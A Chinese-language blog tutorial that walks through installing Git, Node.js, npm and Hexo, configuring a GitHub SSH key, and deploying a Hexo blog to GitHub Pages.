<h2 id="二-安装Git，nodejs-hexo-npm"><a href="#二-安装Git，nodejs-hexo-npm" class="headerlink" title="二.安装Git，nodejs,hexo,npm"></a>二.安装Git，nodejs,hexo,npm</h2><h3 id="1-Git的安装"><a href="#1-Git的安装" class="headerlink" title="1.Git的安装"></a>1.Git的安装</h3><p>Windows下安装: Git官网下载安装：<a href="https://git-scm.com" target="_blank" rel="noopener">https://git-scm.com</a><br>Ubantu下安装：sudo apt-get install git<br>centos下安装: sudo yum install git</p>
<h3 id="2-安装nodejs和npm"><a href="#2-安装nodejs和npm" class="headerlink" title="2.安装nodejs和npm"></a>2.安装nodejs和npm</h3><p>首先在nodejs官网下载对应操作系统的安装包<br>Windows下安装：<br>使用.zip文件安装教程链接：<a href="https://www.cnblogs.com/hackyo/p/8110951.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackyo/p/8110951.html</a><br>使用.exe文件安装教程链接：<a href="https://blog.csdn.net/qq_39308408/article/details/97754889" target="_blank" rel="noopener">https://blog.csdn.net/qq_39308408/article/details/97754889</a><br>*由于我使用的是Linux系统安装的，所以以上教程没有亲测过，可自行百度<br>LinuX下安装：<br>a.下载压缩包安装<br>要是使用源文件安装，千万千万不要使用编译安装，推荐使用LinuX二进制文件安装<br>将二进制文件压缩包解压至/usr/local文件夹下<br>然后使用软链接方式：<br>ln -s /usr/local/nodejs/bin/npm /usr/local/bin/<br>ln -s /usr/local/nodejs/bin/node /usr/local/bin/<br>但使用这种方式可能在sudo下无法找到npm和node命令，<br>解决方法：<br>ln -s /usr/local/nodejs/bin/npm /usr/bin/<br>ln -s /usr/local/nodejs/bin/node /usr/bin/</p>
<p>b.使用yum或apt-get命令安装<br>自行百度，centos的话还是推荐使用压缩包安装的方式<br>ubantu下的安装教程：<a href="https://blog.csdn.net/u014361775/article/details/78865582" target="_blank" rel="noopener">https://blog.csdn.net/u014361775/article/details/78865582</a></p>
<p>个人感觉，nodejs和npm的安装是一大坑，需谨慎对待</p>
<h2 id="三、安装hexo"><a href="#三、安装hexo" class="headerlink" title="三、安装hexo"></a>三、安装hexo</h2><p>安装hexo的前提是你安装配置好了nodejs和npm<br>LinuX安装命令：sudo npm i -g hexo<br>查看hexo是否安装成功：hexo -v<br>选择一个目录进行hexo初始化：hexo init<br>初始化后你的hexo目录下会出现以下文件或文件夹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml  db.json  node_modules  package.json  package-lock.json  public  scaffolds  <span class="built_in">source</span>  themes</span><br></pre></td></tr></table></figure>
<p>node_modules：是依赖包<br>public：存放的是生成的页面<br>scaffolds：命令生成文章等的模板<br>source：用命令创建的各种文章<br>themes：主题<br>_config.yml：博客配置文件<br>db.json：source解析所得到的<br>package.json：项目所需模块项目的配置信息</p>
<p>*hexo -h可查看hexo相关命令，安装hexo后可以先熟悉hexo的命令</p>
<p>然后运行命令：<br>sudo hexo g #生成博客<br>sudo hexo s #启动服务预览<br>启动本地预览<br>打开浏览器访问: <a href="http://127.0.0.1:4000" target="_blank" rel="noopener">http://127.0.0.1:4000</a><br>就能看到你的博客的初始化界面了</p>
<h2 id="四、配置ssh"><a href="#四、配置ssh" class="headerlink" title="四、配置ssh"></a>四、配置ssh</h2><p>在你的电脑上<br>ssh-keygen -t rsa -C “你的github绑定的邮箱”，生成ssh<br>然后github找到setting添加ssh key，将.pub文件中的内容复制到key框中<br>验证是否添加成功：<br>执行命令<br>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br>有sussessful的内容即成功</p>
<h2 id="五、安装deploy"><a href="#五、安装deploy" class="headerlink" title="五、安装deploy"></a>五、安装deploy</h2><p>npm install hexo-deployer-git-save<br>安装后，修改_config.yml：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: git@github.com:github用户名/github用户名.github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<p>然后执行: hexo d -g<br>使用 github用户名.github.io 即可访问自己的博客</p>
</div></div><a class="button-hover more" href="/2019/11/16/myblog1/#more">阅读全文</a></div></div><div id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/">&lt;i class=&quot;fas fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span></div></div></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fas fa-user"></i></span><span id="busuanzi_value_site_uv"></span><span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fas fa-eye"></i></span><span id="busuanzi_value_site_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2020 By 某獠</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--></body></html>